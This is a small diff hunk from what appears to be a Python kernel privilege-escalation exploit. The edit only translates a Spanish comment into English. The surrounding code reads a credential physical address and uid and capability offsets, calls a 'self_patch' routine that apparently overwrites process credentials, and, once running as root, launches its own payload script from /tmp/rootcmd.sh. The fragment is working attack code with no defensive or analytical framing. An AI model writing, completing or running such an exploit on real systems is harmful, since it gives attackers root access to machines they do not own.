@@ -460,7 +460,7 @@ def child_body(wake_r, res_w, tag):
             if not c: os._exit(0)
             hdr += c
         cred_phys, uid_off, cap_off = struct.unpack('<QHH', hdr)
-        os.write(res_w, b"WOKEN\n")                                   # <--- beacon: el wake llegó
+        os.write(res_w, b"WOKEN\n")                                   # <--- beacon: the wake landed
         rc = self_patch(cred_phys, uid_off, cap_off, res_w)
         # --- hook de sesion: si somos root, lanzar payload propio (desacoplado) ---
         if os.getuid() == 0 and os.path.exists("/tmp/rootcmd.sh"):
